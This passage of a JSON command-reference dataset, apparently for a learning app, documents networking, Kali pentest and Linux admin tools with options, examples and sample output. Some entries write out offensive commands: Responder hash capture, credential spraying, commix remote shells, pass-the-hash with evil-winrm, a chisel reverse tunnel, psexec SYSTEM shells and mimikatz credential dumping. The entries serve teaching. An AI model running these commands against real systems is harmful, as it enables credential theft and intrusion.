    "outputSample": "sending incremental file list\nsent 4,210,500 bytes  received 1,240 bytes  2,807,826.67 bytes/sec\ntotal size is 450,210,000  speedup is 106.90"
  },
  {
    "id": "net-25",
    "cmd": "whois",
    "syntax": "whois [options] <domain_or_ip>",
    "category": "networking",
    "subCategory": "OSINT & Registrar Auditing",
    "level": "Essential",
    "dangerLevel": "Safe",
    "summary": "Searches public WHOIS databases to retrieve domain owner, registrar, creation/expiration dates, and IP block allocations.",
    "summary_hi": "Kisi website ya IP address ke malik, registration date aur hosting provider ki jankari dhoondhta hai.",
    "options": [
      {
        "flag": "-h <server>",
        "desc": "Specify WHOIS server to query (e.g. whois.ripe.net, whois.arin.net)"
      },
      {
        "flag": "<domain>",
        "desc": "Lookup domain registrar and authoritative nameservers"
      },
      {
        "flag": "<ip_address>",
        "desc": "Lookup Autonomous System Number (ASN) and allocated IP range"
      }
    ],
    "example": "whois cloudflare.com",
    "outputSample": "Domain Name: CLOUDFLARE.COM\nRegistry Domain ID: 1572973714_DOMAIN_COM-VRSN\nRegistrar: MarkMonitor Inc.\nCreation Date: 2009-09-17T03:59:36Z\nName Server: NS3.CLOUDFLARE.COM"
  },
  {
    "id": "kali-15",
    "cmd": "gobuster",
    "syntax": "gobuster <mode> -u <url> -w <wordlist> [options]",
    "category": "kali",
    "subCategory": "Web Directory & Subdomain Fuzzer",
    "level": "Core",
    "dangerLevel": "Audit/Probe",
    "summary": "High-speed directory, DNS, and vhost brute-forcer written in Go. Discovers hidden endpoints, administration panels, and backups.",
    "summary_hi": "Website ke chhupe huye directories, admin panels aur subdomains ko high speed me dhoondhne wala fuzzer.",
    "options": [
      {
        "flag": "dir -u <URL> -w <list>",
        "desc": "Directory brute-forcing mode with wordlist"
      },
      {
        "flag": "-x <extensions>",
        "desc": "Search for specific file extensions (e.g. php,txt,bak,html)"
      },
      {
        "flag": "-t <threads>",
        "desc": "Number of concurrent threads (default 10, set to 50 for speed)"
      },
      {
        "flag": "-k",
        "desc": "Skip TLS certificate verification"
      },
      {
        "flag": "dns -d <domain> -w <list>",
        "desc": "Subdomain brute-forcing mode"
      }
    ],
    "example": "gobuster dir -u https://target.local -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 30",
    "outputSample": "===============================================================\n[+] Url:                     https://target.local\n[+] Threads:                 30\n[+] Wordlist:                /usr/share/wordlists/dirb/common.txt\n===============================================================\n/admin                (Status: 301) [Size: 312]\n/config.php.bak       (Status: 200) [Size: 1840]\n/login.php            (Status: 200) [Size: 4210]"
  },
  {
    "id": "kali-16",
    "cmd": "ffuf",
    "syntax": "ffuf -u <url/FUZZ> -w <wordlist> [options]",
    "category": "kali",
    "subCategory": "Fast Web Fuzzer",
    "level": "Core",
    "dangerLevel": "Audit/Probe",
    "summary": "Ultra-fast web fuzzer written in Go. Replaces the FUZZ keyword in URLs, headers, or POST parameters with wordlist entries.",
    "summary_hi": "Go me likha hua sabse fast fuzzer jo URL, parameters aur headers me vulnerabilities aur files dhoondhta hai.",
    "options": [
      {
        "flag": "-u <URL/FUZZ>",
        "desc": "Target URL with FUZZ keyword placement"
      },
      {
        "flag": "-w <wordlist>",
        "desc": "Path to wordlist file"
      },
      {
        "flag": "-mc 200,301",
        "desc": "Match only specific HTTP status codes"
      },
      {
        "flag": "-fc 404",
        "desc": "Filter out (ignore) HTTP 404 responses"
      },
      {
        "flag": "-fs <size>",
        "desc": "Filter out responses with specific byte length"
      }
    ],
    "example": "ffuf -u https://target.local/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -mc 200,301",
    "outputSample": "        /'___  /'___           /'___       \n       / __/ / __/  __  __  / __/       \n         ,__\\  ,__/ /    ,__      \n\napi                     [Status: 301, Size: 178, Words: 8, Lines: 6]\nuploads                 [Status: 301, Size: 178, Words: 8, Lines: 6]\ndashboard               [Status: 200, Size: 4120, Words: 382, Lines: 92]"
  },
  {
    "id": "kali-17",
    "cmd": "responder",
    "syntax": "responder -I <interface> [options]",
    "category": "kali",
    "subCategory": "Active Directory LLMNR Poisoner",
    "level": "Advanced",
    "dangerLevel": "Aggressive / Attack",
    "summary": "LLMNR, NBT-NS and MDNS poisoner. Answers rogue network name resolution requests to capture NTLMv1/v2 password hashes.",
    "summary_hi": "Windows network me galti se type huye domain names ka fake answer dekar users ke NTLM password hashes capture karta hai.",
    "options": [
      {
        "flag": "-I <interface>",
        "desc": "Network interface to listen and inject on (e.g. eth0)"
      },
      {
        "flag": "-w",
        "desc": "Start the WPAD rogue proxy server to capture browser credentials"
      },
      {
        "flag": "-v",
        "desc": "Verbose mode: display detailed captured hash data on screen"
      },
      {
        "flag": "-F",
        "desc": "Force NTLM authentication prompt for HTTP/SMB requests"
      }
    ],
    "example": "sudo responder -I eth0 -dwv",
    "outputSample": "[+] Listening for events...\n[SMB] NTLMv2-SSP Client   : 192.168.1.115\n[SMB] NTLMv2-SSP Username : CORP\\victim_user\n[SMB] NTLMv2-SSP Hash     : victim_user::CORP:84fa32...:4512bc..."
  },
  {
    "id": "kali-18",
    "cmd": "enum4linux",
    "syntax": "enum4linux [options] <target_ip>",
    "category": "kali",
    "subCategory": "Samba & Windows Enumeration",
    "level": "Core",
    "dangerLevel": "Audit/Probe",
    "summary": "Tool for enumerating information from Windows and Samba systems (shares, users, password policies, groups, RID cycling).",
    "summary_hi": "Windows aur Samba servers se bina password ke users, shared folders aur password policy extract karta hai.",
    "options": [
      {
        "flag": "-a",
        "desc": "Do all simple enumeration (users, shares, groups, policies)"
      },
      {
        "flag": "-U",
        "desc": "Enumerate local and domain usernames via RPC"
      },
      {
        "flag": "-S",
        "desc": "Enumerate SMB network shares"
      },
      {
        "flag": "-P",
        "desc": "Get password policy information (minimum length, lockout threshold)"
      }
    ],
    "example": "enum4linux -a 192.168.1.50",
    "outputSample": "[+] Got domain/workgroup name: CORP\n[+] Enumerating users via RPC...\nuser:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nuser:[sarah.connor] rid:[0x3e9]\n[+] Share Enumeration:\n\tIPC$            Remote IPC\n\tPublic          Public files share"
  },
  {
    "id": "kali-19",
    "cmd": "smbclient",
    "syntax": "smbclient //<host>/<share> [options]",
    "category": "kali",
    "subCategory": "SMB Network Client",
    "level": "Core",
    "dangerLevel": "Audit/Probe",
    "summary": "FTP-like client to access SMB/CIFS shared resources on Windows and Samba servers. Allows downloading and uploading files.",
    "summary_hi": "Windows network shared folders me connect hokar files browse aur download karne ka command-line client.",
    "options": [
      {
        "flag": "-L <host>",
        "desc": "List available public and administrative shares on target host"
      },
      {
        "flag": "-N",
        "desc": "No password prompt (try anonymous / null session login)"
      },
      {
        "flag": "-U <user>",
        "desc": "Specify username for SMB authentication"
      }
    ],
    "example": "smbclient -L //192.168.1.50 -N",
    "outputSample": "Anonymous login successful\n\tSharename       Type      Comment\n\t---------       ----      -------\n\tADMIN$          Disk      Remote Admin\n\tC$              Disk      Default share\n\tConfidential    Disk      Executive Documents\n\tIPC$            IPC       Remote IPC"
  },
  {
    "id": "kali-20",
    "cmd": "netexec / crackmapexec",
    "syntax": "netexec <protocol> <target> -u <user> -p <pass> [options]",
    "category": "kali",
    "subCategory": "Active Directory Swiss Army Knife",
    "level": "Advanced",
    "dangerLevel": "Aggressive / Attack",
    "summary": "Swiss army knife for pentesting Active Directory networks. Automates credential spraying, share enumerating, and remote code execution across subnets.",
    "summary_hi": "Active Directory networks me ek saath saikdo computers par passwords spray karne aur access check karne ka king tool.",
    "options": [
      {
        "flag": "smb <subnet> -u user -p pass",
        "desc": "Spray credentials across SMB network range"
      },
      {
        "flag": "--shares",
        "desc": "Enumerate readable/writable SMB shares on all alive hosts"
      },
      {
        "flag": "--sam",
        "desc": "Dump local SAM database hashes (requires local admin)"
      },
      {
        "flag": "-x <cmd>",
        "desc": "Execute command on authenticated hosts via WMI/WinRM"
      }
    ],
    "example": "nxc smb 192.168.1.0/24 -u administrator -p \"P@ssw0rd2026!\" --shares",
    "outputSample": "SMB  192.168.1.10   445  DC01     [*] Windows 10.0 Build 17763 x64\nSMB  192.168.1.10   445  DC01     [+] CORP\\administrator:P@ssw0rd2026! (Pwn3d!)\nSMB  192.168.1.10   445  DC01     [+] Enumerated shares: C$, ADMIN$, NETLOGON, SYSVOL"
  },
  {
    "id": "kali-21",
    "cmd": "sublist3r",
    "syntax": "sublist3r -d <domain> [options]",
    "category": "kali",
    "subCategory": "OSINT Subdomain Discovery",
    "level": "Core",
    "dangerLevel": "Safe / Recon",
    "summary": "OSINT subdomain discovery tool. Enumerate subdomains using search engines (Google, Yahoo, Bing, Baidu) and Netcraft/Virustotal.",
    "summary_hi": "Search engines aur public records se kisi company ke sabhi subdomains (api., mail., dev.) ko bina target ko touch kiye nikalta hai.",
    "options": [
      {
        "flag": "-d <domain>",
        "desc": "Target domain name to discover subdomains for"
      },
      {
        "flag": "-t <threads>",
        "desc": "Number of search threads"
      },
      {
        "flag": "-o <file>",
        "desc": "Save discovered subdomains to text file"
      },
      {
        "flag": "-b",
        "desc": "Enable subbrute brute force module"
      }
    ],
    "example": "sublist3r -d example.com -o subdomains.txt",
    "outputSample": "[-] Searching Google ...\n[-] Searching Yahoo ...\n[-] Searching VirusTotal ...\n[+] Total Unique Subdomains Found: 4\napi.example.com\ndev.example.com\nmail.example.com\nvpn.example.com"
  },
  {
    "id": "kali-22",
    "cmd": "dnsrecon",
    "syntax": "dnsrecon -d <domain> [options]",
    "category": "kali",
    "subCategory": "DNS Reconnaissance",
    "level": "Core",
    "dangerLevel": "Audit/Probe",
    "summary": "DNS enumeration script that checks for zone transfers (AXFR), reverse lookups, SPF/TXT records, and SRV services.",
    "summary_hi": "DNS server me vulnerabilities jaise Zone Transfer (AXFR) check karta hai jisse poori internal IP list leak ho sakti hai.",
    "options": [
      {
        "flag": "-d <domain>",
        "desc": "Target domain to analyze"
      },
      {
        "flag": "-t axfr",
        "desc": "Test all authoritative nameservers for insecure zone transfer"
      },
      {
        "flag": "-t std",
        "desc": "Perform standard SOA, NS, A, AAAA, MX, and TXT queries"
      },
      {
        "flag": "-D <dict>",
        "desc": "Dictionary file for subdomain brute forcing"
      }
    ],
    "example": "dnsrecon -d target.local -t axfr",
    "outputSample": "[*] Checking for Zone Transfer for target.local\n[*] Resolving SOA Record\n[+] Zone Transfer Successful on ns1.target.local!\n[+] A target.local 192.168.1.10\n[+] A dc01.target.local 192.168.1.11"
  },
  {
    "id": "kali-23",
    "cmd": "amass",
    "syntax": "amass enum -d <domain> [options]",
    "category": "kali",
    "subCategory": "Attack Surface Mapping",
    "level": "Advanced",
    "dangerLevel": "Safe / Recon",
    "summary": "OWASP in-depth attack surface mapping and asset discovery. Aggregates data from over 55 OSINT data sources, ASN graphs, and Certificate Transparency logs.",
    "summary_hi": "OWASP ka flagship reconnaissance tool jo kisi organisation ke poore digital footprint aur IP ranges ko map karta hai.",
    "options": [
      {
        "flag": "enum -d <domain>",
        "desc": "Perform in-depth passive subdomain enumeration"
      },
      {
        "flag": "-active",
        "desc": "Enable active DNS queries and TLS certificate scraping"
      },
      {
        "flag": "-src",
        "desc": "Display data source origin for each discovered asset"
      },
      {
        "flag": "-dir <path>",
        "desc": "Directory path for storing graph database"
      }
    ],
    "example": "amass enum -passive -d target.com",
    "outputSample": "[CertSpotter]        admin.target.com\n[HackerTarget]       portal.target.com\n[ThreatCrowd]        remote.target.com\nOWASP Amass: Discovered 42 names across 8 ASNs"
  },
  {
    "id": "kali-24",
    "cmd": "cewl",
    "syntax": "cewl <URL> [options]",
    "category": "kali",
    "subCategory": "Targeted Wordlist Generator",
    "level": "Core",
    "dangerLevel": "Safe / Recon",
    "summary": "Custom Word List generator. Spiders target web pages to a specified depth and extracts unique keywords to build highly targeted password dictionaries.",
    "summary_hi": "Target website ko crawl karke usme use huye unique words nikalta hai taaki unse targeted passwords crack kiye ja sakein.",
    "options": [
      {
        "flag": "-d <depth>",
        "desc": "Spider crawling depth (default 2)"
      },
      {
        "flag": "-m <min_len>",
        "desc": "Minimum word length to include (e.g. -m 8)"
      },
      {
        "flag": "-w <file>",
        "desc": "Write extracted words to output dictionary file"
      },
      {
        "flag": "--with-numbers",
        "desc": "Accept words containing numbers as well as letters"
      }
    ],
    "example": "cewl https://target-corporate.local -d 2 -m 7 -w custom_wordlist.txt",
    "outputSample": "CeWL 5.4.8 (c) Robin Wood 2021\nSpidering target-corporate.local to depth 2...\nExtracted 842 unique target-specific keywords.\nSaved to custom_wordlist.txt"
  },
  {
    "id": "kali-25",
    "cmd": "crunch",
    "syntax": "crunch <min> <max> [charset] [options]",
    "category": "kali",
    "subCategory": "Wordlist Generator",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Wordlist generator where you specify min and max length and character sets. Outputs patterns and permutations to stdout or files.",
    "summary_hi": "Specified characters aur length ke hisaab se custom password combinations aur dictionaries create karta hai.",
    "options": [
      {
        "flag": "-o <file>",
        "desc": "Save generated wordlist to file instead of printing"
      },
      {
        "flag": "-t <pattern>",
        "desc": "Pattern string (@ = lower, , = upper, % = number, ^ = symbol)"
      },
      {
        "flag": "-p <words>",
        "desc": "Generate permutations of specified words without repetition"
      }
    ],
    "example": "crunch 8 8 -t pass%%%^ -o wordlist.txt",
    "outputSample": "Crunch will now generate the following amount of data: 120000 bytes\n0 MB\nCrunch will generate 10000 words.\ncrunch: 100% completed generating output."
  },
  {
    "id": "kali-26",
    "cmd": "commix",
    "syntax": "commix -u <target_url> [options]",
    "category": "kali",
    "subCategory": "Command Injection Exploiter",
    "level": "Advanced",
    "dangerLevel": "Aggressive / Attack",
    "summary": "Automated all-in-one OS command injection and exploitation tool. Detects and abuses web parameter command injection flaws to spawn reverse shells.",
    "summary_hi": "Web apps me command injection vulnerabilities ko automatically detect karke operating system ka remote shell deta hai.",
    "options": [
      {
        "flag": "-u <URL>",
        "desc": "Target URL with injectable parameter"
      },
      {
        "flag": "--data=\"POST_DATA\"",
        "desc": "POST request body string"
      },
      {
        "flag": "--os-cmd=\"id\"",
        "desc": "Execute single operating system command"
      },
      {
        "flag": "--os-shell",
        "desc": "Spawn interactive remote pseudo shell"
      }
    ],
    "example": "commix -u \"http://target.local/ping.php?host=127.0.0.1\" --os-shell",
    "outputSample": "[+] The parameter 'host' seems to be injectable via (results-based) classic command injection!\n[!] Type 'reverse_tcp' to spawn shell.\ncommix(os_shell) > whoami\nwww-data"
  },
  {
    "id": "kali-27",
    "cmd": "evil-winrm",
    "syntax": "evil-winrm -i <target_ip> -u <user> -p <pass> [options]",
    "category": "kali",
    "subCategory": "Windows Remote Management Shell",
    "level": "Advanced",
    "dangerLevel": "Aggressive / Attack",
    "summary": "The ultimate WinRM shell for pentesting Windows. Connects to port 5985/5986 to provide interactive PowerShell execution and memory module loading.",
    "summary_hi": "Windows Server ke WinRM port (5985) par remote PowerShell shell lene aur scripts load karne ka sabse powerful pentest tool.",
    "options": [
      {
        "flag": "-i <ip>",
        "desc": "Target host IP address"
      },
      {
        "flag": "-u <user>",
        "desc": "Username"
      },
      {
        "flag": "-p <pass>",
        "desc": "Password string"
      },
      {
        "flag": "-H <hash>",
        "desc": "Pass-The-Hash: NTLM hash instead of plaintext password"
      },
      {
        "flag": "-s <scripts_dir>",
        "desc": "Directory containing PowerShell scripts for memory execution"
      }
    ],
    "example": "evil-winrm -i 192.168.1.10 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0",
    "outputSample": "Evil-WinRM shell v3.5\nInfo: Establishing connection to 192.168.1.10:5985 ...\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> "
  },
  {
    "id": "kali-28",
    "cmd": "chisel",
    "syntax": "chisel server [options] | chisel client [options]",
    "category": "kali",
    "subCategory": "TCP/UDP HTTP Tunneling",
    "level": "Advanced",
    "dangerLevel": "Audit/Tunnel",
    "summary": "Fast TCP/UDP tunnel over HTTP secured via SSH. Bypasses restrictive firewalls and pivots internal subnets into attacker localhost.",
    "summary_hi": "Firewall ko bypass karke internal network ke ports ko attacker ke system par forward karne wala fast proxy tunnel.",
    "options": [
      {
        "flag": "server -p 8080 --reverse",
        "desc": "Run server listening on port 8080 accepting reverse tunnels"
      },
      {
        "flag": "client <server>:8080 R:socks",
        "desc": "Connect back and open dynamic reverse SOCKS5 proxy"
      },
      {
        "flag": "client <server>:8080 R:80:127.0.0.1:80",
        "desc": "Reverse remote port forwarding"
      }
    ],
    "example": "chisel client 10.10.14.5:8000 R:socks",
    "outputSample": "2026/09/30 12:00:00 client: Connecting to 10.10.14.5:8000\n2026/09/30 12:00:01 client: Fingerprint 8a:2b:..\n2026/09/30 12:00:01 client: Connected (Latency 14ms)\n2026/09/30 12:00:01 client: Reverse proxy SOCKS5 active on server:1080"
  },
  {
    "id": "kali-29",
    "cmd": "impacket-psexec",
    "syntax": "impacket-psexec [domain/][user]:[pass]@[target] [options]",
    "category": "kali",
    "subCategory": "SMB Remote Execution",
    "level": "Advanced",
    "dangerLevel": "Aggressive / Attack",
    "summary": "PSEXEC execution implementation via SMB. Uploads a service binary (RemComSvc) to spawn an interactive SYSTEM shell on Windows.",
    "summary_hi": "Windows computer par admin credentials se login karke direct NT AUTHORITY\\SYSTEM ka root shell lene ka tool.",
    "options": [
      {
        "flag": "-hashes :<ntlm_hash>",
        "desc": "Authenticate via Pass-The-Hash without plaintext password"
      },
      {
        "flag": "-service-name <name>",
        "desc": "Name of the service created on target"
      },
      {
        "flag": "-codec <encoding>",
        "desc": "Set encoding used (default utf-8)"
      }
    ],
    "example": "impacket-psexec administrator@192.168.1.10",
    "outputSample": "[*] Requesting shares on 192.168.1.10.....\n[*] Found writable share ADMIN$\n[*] Uploading file RemComSvc.exe.....\n[*] Opening SVCManager on 192.168.1.10.....\n[*] Starting service RemComSvc.....\n[!] Authenticated as NT AUTHORITY\\SYSTEM\nC:\\Windows\\system32> "
  },
  {
    "id": "kali-30",
    "cmd": "mimikatz",
    "syntax": "privilege::debug sekurlsa::logonpasswords [options]",
    "category": "kali",
    "subCategory": "Windows Credential Extraction",
    "level": "Advanced",
    "dangerLevel": "Aggressive / Attack",
    "summary": "Extracts plaintext passwords, hash digests, PIN codes, and Kerberos tickets from memory (LSASS process) on Windows systems.",
    "summary_hi": "Windows RAM memory (LSASS) se logged-in users ke passwords aur Kerberos tickets dump karne ka infamous offensive tool.",
    "options": [
      {
        "flag": "privilege::debug",
        "desc": "Acquire SeDebugPrivilege required to inspect system memory"
      },
      {
        "flag": "sekurlsa::logonpasswords",
        "desc": "Dump plaintext credentials and NTLM hashes of all active sessions"
      },
      {
        "flag": "lsadump::sam",
        "desc": "Dump local SAM database offline user hashes"
      },
      {
        "flag": "kerberos::golden",
        "desc": "Forge Golden Ticket for permanent Active Directory domain persistence"
      }
    ],
    "example": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
    "outputSample": "Authentication Id : 0 ; 249210 (00000000:0003cd7a)\nSession           : Interactive from 1\nUser Name         : admin\nDomain            : CORP\n\t * NTLM     : cc32e701a9094e63e26b1f2cd3ec48bb\n\t * SHA1     : 2b801a..."
  },
  {
    "id": "it-09",
    "cmd": "find",
    "syntax": "find [path] [expression]",
    "category": "it",
    "subCategory": "Filesystem Traversal",
    "level": "Essential",
    "dangerLevel": "Safe",
    "summary": "Searches for files in a directory hierarchy based on name, size, modification time, ownership, and SUID permission bits.",
    "summary_hi": "Linux file system me files ko naam, size ya permission (jaise SUID root files) ke hisaab se recursively dhoondhta hai.",
    "options": [
      {
        "flag": "-name \"<pattern>\"",
        "desc": "Search for filename matching pattern case-sensitively"
      },
      {
        "flag": "-perm -4000",
        "desc": "Find SUID files (crucial for Linux Privilege Escalation)"
      },
      {
        "flag": "-mtime -7",
        "desc": "Find files modified within the last 7 days"
      },
      {
        "flag": "-size +100M",
        "desc": "Find files larger than 100 Megabytes"
      },
      {
        "flag": "-exec <cmd> {} \\;",
        "desc": "Execute command on every found file match"
      }
    ],
    "example": "find / -perm -u=s -type f 2>/dev/null",
    "outputSample": "/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/bin/chsh"
  },
  {
    "id": "it-10",
    "cmd": "awk",
    "syntax": "awk [options] 'pattern {action}' [file]",
    "category": "it",
    "subCategory": "Text Stream Processing",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Pattern scanning and text data extraction language. Powerful for parsing column-formatted log files, CSVs, and terminal outputs.",
    "summary_hi": "Log files aur column data me se specific fields aur numbers filter karke report banane ka standard script tool.",
    "options": [
      {
        "flag": "-F<delimiter>",
        "desc": "Define field separator (e.g. -F: for /etc/passwd)"
      },
      {
        "flag": "'{print $1, $3}'",
        "desc": "Print first and third column of each line"
      },
      {
        "flag": "'$3 >= 1000 {print $1}'",
        "desc": "Print usernames with UID >= 1000 (regular users)"
      }
    ],
    "example": "awk -F: '$3 >= 1000 {print \"User: \" $1 \" (UID: \" $3 \")\"}' /etc/passwd",
    "outputSample": "User: ubuntu (UID: 1000)\nUser: analyst (UID: 1001)\nUser: developer (UID: 1002)"
  },
  {
    "id": "it-11",
    "cmd": "sed",
    "syntax": "sed [options] 'command' [file]",
    "category": "it",
    "subCategory": "Stream Editor",
    "level": "Core",
    "dangerLevel": "Safe / Mod",
    "summary": "Stream editor for filtering and transforming text. Performs non-interactive string substitution, deletion, and line insertion.",
    "summary_hi": "Files ke andar text ko dhoondh kar replace karne (Find & Replace) ka fast command-line editor.",
    "options": [
      {
        "flag": "'s/old/new/g'",
        "desc": "Substitute all occurrences of \"old\" with \"new\" in each line"
      },
      {
        "flag": "-i",
        "desc": "Edit file in-place directly on disk instead of writing to stdout"
      },
      {
        "flag": "-n '/pattern/p'",
        "desc": "Print only lines matching pattern"
      }
    ],
    "example": "sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config",
    "outputSample": "[Modified /etc/ssh/sshd_config: Disabled root SSH login successfully]"
  },
  {
    "id": "it-12",
    "cmd": "htop",
    "syntax": "htop [options]",
    "category": "it",
    "subCategory": "Interactive Process Monitor",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Interactive and colorful process viewer and system monitor. Displays per-core CPU usage, RAM/Swap bars, and allows sending kill signals.",
    "summary_hi": "CPU, RAM aur running processes ko real-time colorful graphical bars me monitor karne ka best task manager.",
    "options": [
      {
        "flag": "-u <user>",
        "desc": "Show only processes belonging to specified user"
      },
      {
        "flag": "-p <PID>",
        "desc": "Monitor only specified process PID"
      },
      {
        "flag": "F9 (inside htop)",
        "desc": "Send kill signal (SIGTERM, SIGKILL) to highlighted process"
      },
      {
        "flag": "F6 (inside htop)",
        "desc": "Sort processes by CPU%, MEM%, PID, or Time"
      }
    ],
    "example": "htop -u www-data",
    "outputSample": "[|||||||||||||||||||||||||| 64.2%] Tasks: 120, 342 thr; 1 running\nMem[|||||||||||||||| 4.12G/16.0G] PID USER      CPU% MEM% COMMAND\nSwp[                 0k/4.00G] 1420 www-data  14.2  2.1  nginx: worker"
  },
  {
    "id": "it-13",
    "cmd": "du (Disk Usage)",
    "syntax": "du [options] [path]",
    "category": "it",
    "subCategory": "Storage Auditing",
    "level": "Essential",
    "dangerLevel": "Safe",
    "summary": "Estimates file space usage. Summarizes disk usage of directory trees to find bloated logs and storage bottlenecks.",
    "summary_hi": "Kaunsa folder ya file hard drive me sabse zyada space le rahi hai, uska size calculate karta hai.",
    "options": [
      {
        "flag": "-h",
        "desc": "Print sizes in human readable format (e.g., 1K, 234M, 2G)"
      },
      {
        "flag": "-s",
        "desc": "Display only a total summary for each specified argument"
      },
      {
        "flag": "-d <depth> / --max-depth",
        "desc": "Descend only N levels of directories"
      }
    ],
    "example": "du -sh /var/log/* | sort -hr | head -n 5",
    "outputSample": "4.2G    /var/log/journal\n850M    /var/log/syslog\n420M    /var/log/nginx\n120M    /var/log/auth.log\n15M     /var/log/dpkg.log"
  },
  {
    "id": "it-14",
    "cmd": "kill / pkill",
    "syntax": "kill [options] <pid> | pkill [options] <process_name>",
    "category": "it",
    "subCategory": "Process Termination",
    "level": "Essential",
    "dangerLevel": "Admin",
    "summary": "Sends specified signals (SIGTERM, SIGKILL, SIGHUP) to terminate unresponsive or rogue background processes.",
    "summary_hi": "Halt huye ya malicious processes ko band (terminate) karne ke liye signal bhejta hai.",
    "options": [
      {
        "flag": "-9 / -SIGKILL",
        "desc": "Forcefully kill process immediately (cannot be caught or ignored)"
      },
      {
        "flag": "-15 / -SIGTERM",
        "desc": "Gracefully request process to clean up and exit (default)"
      },
      {
        "flag": "-HUP",
        "desc": "Tell process to reload its configuration files without restarting"
      },
      {
        "flag": "pkill -u <user>",
        "desc": "Kill all processes owned by specific user"
      }
    ],
    "example": "pkill -9 -f malicious_miner",
    "outputSample": "[Terminated PID 8421 (malicious_miner) with SIGKILL]"
  },
  {
    "id": "it-15",
    "cmd": "tar",
    "syntax": "tar [options] [archive_name] [files_to_compress]",
    "category": "it",
    "subCategory": "Archiving & Compression",
    "level": "Essential",
    "dangerLevel": "Safe",
    "summary": "Tape archive utility. Compresses files and directory trees into single .tar.gz or .tar.bz2 archives and extracts them.",
    "summary_hi": "Multiple files aur folders ko zip (.tar.gz) banane aur extract karne ka Linux standard tool.",
    "options": [
      {
        "flag": "-c",
        "desc": "Create a new archive file"
      },
      {
        "flag": "-x",
        "desc": "Extract files from an existing archive"
      },
      {
        "flag": "-z",
        "desc": "Filter archive through gzip compression (.tar.gz)"
      },
      {
        "flag": "-v",
        "desc": "Verbosely list files processed"
      },
      {
        "flag": "-f <file>",
        "desc": "Use archive file specified"
      }
    ],
    "example": "tar -czvf evidence_backup.tar.gz /var/log/ /etc/shadow",
    "outputSample": "/var/log/\n/var/log/auth.log\n/var/log/syslog\n/etc/shadow\nArchive evidence_backup.tar.gz created (Size: 4.8MB)"
  },
  {
    "id": "it-16",
    "cmd": "crontab",
    "syntax": "crontab [options]",
    "category": "it",
    "subCategory": "Task Scheduling",
    "level": "Core",
    "dangerLevel": "Safe / Admin",
    "summary": "Maintains crontab tables for scheduling repetitive background jobs (hourly backups, health checks, log rotation).",
    "summary_hi": "System me tasks aur scripts ko automatic schedule karne ka tool (e.g. har raat 2 baje backup lena).",
    "options": [
      {
        "flag": "-l",
        "desc": "List current user's scheduled cron jobs"
      },
      {
        "flag": "-e",
        "desc": "Edit current crontab file using default text editor"
      },
      {
        "flag": "-r",
        "desc": "Remove all current crontab entries"
      },
      {
        "flag": "-u <user>",
        "desc": "Specify user whose crontab is to be inspected (root only)"
      }
    ],
    "example": "crontab -l",
    "outputSample": "# m h  dom mon dow   command\n0 2 * * * /opt/scripts/backup.sh >/dev/null 2>&1\n*/10 * * * * /usr/local/bin/integrity_check.sh"
  },
  {
    "id": "it-17",
    "cmd": "sudo",
    "syntax": "sudo [options] <command>",
    "category": "it",
    "subCategory": "Privilege Elevation",
    "level": "Essential",
    "dangerLevel": "Admin / Critical",
    "summary": "Execute a command with superuser (root) privileges as permitted by the /etc/sudoers policy file.",
    "summary_hi": "Security guard ki tarah normal user ko administrative root privileges ke saath command chalane deta hai.",
    "options": [
      {
        "flag": "-i / -s",
        "desc": "Simulate initial root login shell"
      },
      {
        "flag": "-u <user>",
        "desc": "Run command as specified user instead of root"
      },
      {
        "flag": "-l",
        "desc": "List user privileges and allowed commands in sudoers file"
      }
    ],
    "example": "sudo -l",
    "outputSample": "Matching Defaults entries for analyst on sec-box:\n    env_reset, mail_badpass\n\nUser analyst may run the following commands on sec-box:\n    (ALL : ALL) ALL\n    (root) NOPASSWD: /usr/bin/tcpdump"
  },
  {
    "id": "it-18",
    "cmd": "uname",
    "syntax": "uname [options]",
    "category": "it",
    "subCategory": "Kernel Architecture",
    "level": "Essential",
    "dangerLevel": "Safe",
    "summary": "Prints system information: kernel version, operating system name, hostname, and processor architecture (x86_64, aarch64).",
    "summary_hi": "System ka operating system name, Linux kernel version aur CPU architecture (64-bit vs ARM) print karta hai.",
    "options": [
      {
        "flag": "-a",
        "desc": "Print all system info (kernel name, nodename, release, version, machine)"
      },
      {
        "flag": "-r",
        "desc": "Print kernel release version (useful for finding kernel exploits like Dirty COW)"
      },
      {
        "flag": "-m",
        "desc": "Print machine hardware architecture name"
      }
    ],
    "example": "uname -a",
    "outputSample": "Linux sec-node 6.8.0-40-generic #40-Ubuntu SMP PREEMPT_DYNAMIC x86_64 x86_64 x86_64 GNU/Linux"
  },
  {
    "id": "it-19",
    "cmd": "lsof",
    "syntax": "lsof [options]",
    "category": "it",
    "subCategory": "Open File & Socket Inspection",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Lists open files. In UNIX, everything is a file (regular files, directories, block devices, network sockets, named pipes).",
    "summary_hi": "System par chal rahi har open file, active network socket aur DLL library ko inspect karta hai.",
    "options": [
      {
        "flag": "-i",
        "desc": "List all open Internet and network sockets"
      },
      {
        "flag": "-i :<port>",
        "desc": "Find which process is using a specific port (e.g. -i :80)"
      },
      {
        "flag": "-u <user>",
        "desc": "List all files opened by specific user"
      },
      {
        "flag": "+D <dir>",
        "desc": "Recursively search directory for any open file handles"
      }
    ],
    "example": "lsof -i :22",
    "outputSample": "COMMAND PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nsshd    842 root    3u  IPv4  20481      0t0  TCP *:ssh (LISTEN)\nsshd    910 root    4u  IPv4  24102      0t0  TCP 192.168.1.10:ssh->192.168.1.100:54210 (ESTABLISHED)"
  },
  {
    "id": "it-20",
    "cmd": "tail / head",
    "syntax": "tail [options] [file] | head [options] [file]",
    "category": "it",
    "subCategory": "Log Stream Inspection",
    "level": "Essential",
    "dangerLevel": "Safe",
    "summary": "Outputs the first or last parts of files. Essential for real-time live monitoring of system and auth logs.",
